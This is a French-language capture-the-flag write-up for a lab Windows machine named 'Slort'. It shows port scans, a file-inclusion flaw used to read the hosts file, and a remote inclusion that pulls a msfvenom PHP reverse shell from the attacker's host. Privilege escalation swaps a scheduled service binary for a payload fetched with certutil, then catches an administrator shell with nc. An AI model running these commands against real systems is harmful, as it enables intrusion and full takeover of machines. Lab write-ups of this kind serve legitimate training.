  # Slort

	sudo masscan -p1-65535,U:1-65535 192.168.240.53 -e tun0 > ports.txt
	sudo nmap -p- -sV -T4 192.168.240.53 -oN nmap.txt
	feroxbuster --silent -u http://192.168.240.53:8080
	
Scans classiques.

	PORT STATE SERVICE VERSION  
	21/tcp open ftp FileZilla ftpd 0.9.41 beta  
	135/tcp open msrpc Microsoft Windows RPC  
	139/tcp open netbios-ssn Microsoft Windows netbios-ssn  
	445/tcp open microsoft-ds?  
	3306/tcp open mysql?  
	4443/tcp open http Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)  
	5040/tcp open unknown  
	8080/tcp open http Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)  
	49664/tcp open msrpc Microsoft Windows RPC  
	49665/tcp open msrpc Microsoft Windows RPC  
	49666/tcp open msrpc Microsoft Windows RPC  
	49667/tcp open msrpc Microsoft Windows RPC  
	49668/tcp open msrpc Microsoft Windows RPC  
	49669/tcp open msrpc Microsoft Windows RPC

L'URL http://192.168.240.53:8080/site/ redirige sur http://192.168.240.53:8080/site/index.php?page=main.php et cela semble être la vraie racine du site. La structure de l'URL fait directement penser à de l'inclusion de fichiers. 

J'ai essayé  http://192.168.240.53:8080/site/index.php?page=../../../../../Windows/System32/drivers/etc/hosts et cela a fonctionné, j'ai pu lire le fichier hosts de la machine. Il n'y a apparemment pas de SSH sur cette VM donc impossible de lire des clés RSA. Il me reste deux principales options : lire les pages PHP avec un wrapper, ou une RFI. 

J'ai d'abord testé la RFI juste parce que c'est l'option la plus simple à vérifier, mais cela a fonctionné : 

	echo "test" >> test.txt
	python -m http.server 8000
	...
	curl "http://192.168.240.53:8080/site/index.php?page=http://192.168.45.194:8000/test.txt"

J'ai voulu injecter une backdoor classique mais je n'ai pas réussi à trouver le dossier où elle atterrissait. Injection d'un reverse-shell à la place : 
	
	msfvenom -p php/reverse_php LHOST=192.168.45.194 LPORT=443 -f raw > rev.php
	...
	curl "http://192.168.240.53:8080/site/index.php?page=http://192.168.45.194:8000/rev.php"
	...
	msfconsole -x "use exploit/multi/handler;set payload php/reverse_php;set LHOST 192.168.45.194;set LPORT 443;run;"
	...
	powershell -ep bypass
	whoami
	type C:\Users\rupert\Desktop\local.txt

Élévation de privilèges : 

En fouillant dans le C:\ on trouve un dossier "Backup" contenant quelques informations ainsi qu'un service apparemment lancé toutes les 5 minutes. On a les droits d'écriture dans le dossier, c'est donc un simple remplacement de service : 

	cd C:\Backup
	ren TFTP.exe TFTP.exe.old
	certutil.exe -urlcache -f http://192.168.45.194:8000/msfvenom.exe C:\Backup\TFTP.exe

On reçoit la connexion quelques minutes après : 

	rlwrap nc -nvlp 443
	...
	whoami
	type C:\Users\Administrator\Desktop\proof.txt
